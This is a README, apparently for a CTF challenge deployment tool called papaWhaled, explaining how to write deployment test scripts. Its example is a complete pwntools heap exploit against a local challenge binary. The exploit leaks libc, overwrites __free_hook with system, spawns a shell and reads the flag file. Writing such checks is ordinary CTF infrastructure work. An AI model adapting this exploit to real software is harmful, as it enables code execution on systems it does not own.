# How to write test script?

If you upload challenge zip file, **papaWhaled** firstly do some docker process, and then test to check whether challenge is deployed well or not. 

This test would be done by following command, where `[port]` and `[flag]` are passed by papaWhaled, and `[test]` is decided by your included `props.json`.

    ./[test] [port] [flag]

If return value of this command is **False(0)**, this challenge is thought to be well deployed, else it is failed to be deployed.

*Because it only cares return value, test is not need to be script. It can be whatever that returns. (i.e, ELF)*

In sum, here are the things that you should consider before write/make your **tester**.

1. Must include shebang(`#!`) if your `[test]` is not common executable like ELF.
2. Can grab the port and flag by parsing the argvs.
3. Must return **False** if test is success, else return **True**. (You can check it by evaluating the flag)
4. If uploaded challenge is deployed as **auto**, flag would be always at `/home/user/flag`.
5. If your test succeeds stochatically, test several times on your script. *Maybe this feature would be added soon.*

Here is the example.

    #!/usr/bin/python <= Include shebang, or it can crush!
    from pwn import *
    import sys
    
    #Grab the port and flag from argvs
    port = sys.argv[1]
    flag = sys.argv[2]
    
    p=remote("localhost", port)
    
    sa = lambda x,y : p.sendafter(x,y)
    cho = lambda x : sa("Choice",str(x))
    go = lambda : p.interactive()
    
    def add(size,data):
        cho(1)
        sa("size",str(size))
        sa("data",data)
    
    def edit(idx,size,data):
        cho(2)
        sa("index",str(idx))
        sa("size",str(size))
        sa("data",data)
    
    def delete(idx):
        cho(3)
        sa("index",str(idx))
    
    def edit_name(c,name):
        cho(4)
        sa("edit",c)
        if c=='Y':
            sa("name",name)
        else:
            p.recvuntil("Name: ")
            return p.recvline()[:-1]
    
    sa("name","\x00")
    
    for i in range(3):
        add(0x50,str(i)*0x50)
    add(0x40,"/bin/sh\x00")
    add(0x40,"/bin/sh\x00")
    for i in range(16):
        print i
        add(0x40,str(i)*0x40)
    
    hb = u64(edit_name('N',1).ljust(8,'\x00'))-0x790-0x140
    print hex(hb)
    
    for i in range(7):
        edit_name('Y',p64(0x602120)+p64(0)+p64(0)+p64(0xc1))
        delete(20)
    
    edit_name("Y",p64(0x602120)+p64(0)+p64(0)+p64(0xc1)+"A"*0xb0+p64(0)+p64(0x21)+p64(0)*3+p64(0x21))
    delete(20)
    edit_name("Y","A"*0x20)
    p.recvuntil("A"*0x20)
    lb = u64(p.recvline()[:-1]+'\x00'*2) - 0x3ebca0
    fh = lb + 0x3ed8e8
    system = lb + 0x4f440
    
    edit_name('Y',p64(hb+0x250+0x10))
    delete(0)
    delete(1)
    delete(20)
    delete(3)
    add(0x50,p64(fh))
    add(0x50,"FAKE")
    add(0x50,p64(fh))
    add(0x50,p64(system))
    
    delete(4)
    
    #Check the test result and return.
    p.sendline("cat /home/user/flag")
    p.recv()
    if flag in p.recv(4096):
        sys.exit(False) # If success, return False!
    else:
        sys.exit(True)